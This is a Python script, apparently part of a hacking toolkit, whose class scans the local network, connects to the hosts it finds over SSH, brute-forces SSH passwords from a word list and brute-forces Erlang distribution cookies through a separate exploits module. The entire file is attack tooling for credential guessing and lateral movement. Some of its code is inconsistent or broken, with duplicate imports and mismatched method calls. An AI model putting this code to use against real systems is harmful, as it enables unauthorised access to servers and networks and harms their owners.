#!/bin/env python
import sys
import os
import netifaces
import paramiko
import subprocess
import listen as connect_listen
import logging
import exploits
import main
import netifaces

addrs = netifaces.gateways()

class main(connect_listen.connect_listen):
    def __init__(self, hostname, port, username, password):
        super().__init__(hostname, port, username , password)
        self.networkfile = open("network.txt", "r+")
        self.passfile = open("pass.txt", "r+")
        self.perf = open("mem.txt", "r+")



    def interface_get(self):
      print(str(addrs.keys()))
      print(addrs)

    def connect_normal(self):
     print(f'connecting to {self.hostname}')
     try:
      connect_listen.connect_listen.ssh_connect(self, pkey = None)
     except:
      print("error")

    def bruteforce(self):
     print(f'...bruteforcing {self.hostname} on port {self.port}')

     for password in self.passfile:
      try:
        connect_listen.connect_listen.ssh_connect(self, password, pkey = None)
        print(f'[+] {password}')
      except:
        print(f'[-] {password}')
        pass

    def testing_preferences(self):
      print(f'...requesting preferences {self.hostname} on port {self.port}')

      for p in self.perf:
       connect_listen.connect_listen.preference(self, _pubkeys = p , _key = p, _compression = p, _kex = p, _macs = p, _cipher = p)


    def read_network(self):
     print("... reading network")
     os.system("bash discover.sh")

     for host in self.networkfile:
      try:
       print(f'Connecting[+] {host}')
       self.hostname = host
       connect_listen.connect_listen().ssh_connect(passwords = self.password, pkey = self.get_keyfile())
      except:
        print(f'Connection Failed[-] {host}')
        pass


    def cookie_bruteforce(self):
     myline = self.perf.readline()
     for p in self.perf:
      try:
       exploits.exploits(self.hostname, self.port, self.username, self.password).erlangcookie(p)
      except:
          pass
